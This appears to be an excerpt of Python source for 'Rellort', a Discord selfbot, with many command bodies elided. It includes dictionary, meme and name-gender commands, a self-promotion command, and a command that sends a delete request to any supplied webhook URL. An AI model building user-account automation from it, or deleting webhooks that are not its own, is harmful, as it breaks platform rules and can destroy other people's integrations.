@Rellort.command(aliases=['urbandictionary',"dictionary"])
async def ud(ctx,*,wordtodefine=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if wordtodefine == None:  
        embed=discord.Embed(title="Rellort Selfbot - Urban Dictionary Command", description=f"You didn't supply a word to define?", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        ...
        try:
            ...
            embed=discord.Embed(title="Rellort Selfbot - Urban Dictionary Command", description=f"Definition of `{wordtodefine}`\n{finaldef}\n\n", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(content="",embed=embed)
        except:
            embed=discord.Embed(title="Rellort Selfbot - Urban Dictionary Command", description=f"Error when searching for the term : `{wordtodefine}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(content="",embed=embed)           

@Rellort.command(aliases=['deepfri'])
...
@Rellort.command(aliases=['magicify',"magikify"])
...
@Rellort.command(aliases=['jealous',"distracted"])
...
@Rellort.command(aliases=['whowouldwin'])
...
@Rellort.command(aliases=['catcha',"capture"]) #for those who cant spell
...
@Rellort.command(aliases=['threats'])
...
@Rellort.command(aliases=["twitter","twittertweet"])
...
@Rellort.command(aliases=["cmm","changemind"])
...
@Rellort.command(aliases=["kanagen"])
...
@Rellort.command(aliases=["iphoneex","phone","iphone"])
...
@Rellort.command(aliases=["Rellortselfbot","Rellort","link","website"])
async def download(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url="https://images-ext-2.discordapp.net/external/zPIBq2_XbF_S_qHEDwyAJgvoArpeppIgEZW8iFd-03Q/https/cdn.mee6.xyz/guild-images/828480491543461959/b8eb2adcc5e4e3dcad41801470556fe0dd63d374b0a01934d83c15078263676a.gif")
    await ctx.message.edit(content="https://github.com/SnatchingSouls/Rellort-Selfbot Rellort selfbot - Rellort selfbot was made as a fun project.\nRellort is free and has creative commands - why wouldn't you try it out\nIt has a wide range of commands, uses fun apis and is simple to setup - no api keys needed",embed=embed)  

@Rellort.command(aliases=["gender"])
async def name(ctx,*,namesupplied=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if namesupplied == None:
        embed=discord.Embed(title="Rellort Selfbot - Gender command", description=f"You didn't supply a name\n{prefix.strip()}name [name]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        ...
        embed=discord.Embed(title="Rellort Selfbot - Gender command", description=f"Majority of people named {namesupplied} are {gen}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)

@Rellort.command(aliases=['qrcode'])
...
@Rellort.command(aliases=['deletewebhook'])
async def webhookdelete(ctx,link=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if link == None:
        embed=discord.Embed(title="Rellort Selfbot - No webhook supplied", description=f"{prefix.strip()}webhookdelete [webhook]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        embed=discord.Embed(title="Rellort Selfbot - Deleting webhook", description=f"Sending a delete request to\n{link}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
        await ctx.message.edit(content="",embed=embed)
        ...
        if result.status_code == 204:
            embed=discord.Embed(title="Rellort Selfbot - Webhook Deleted", description=f"Yay", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(embed=embed)
        else:
            embed=discord.Embed(title="Rellort Selfbot - Error Deleting Webhook", description=f"Delete request responded with status code : {result.status_code}\{result.text}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/SnatchingSouls/Rellort-Selfbot")
            await ctx.message.edit(embed=embed)
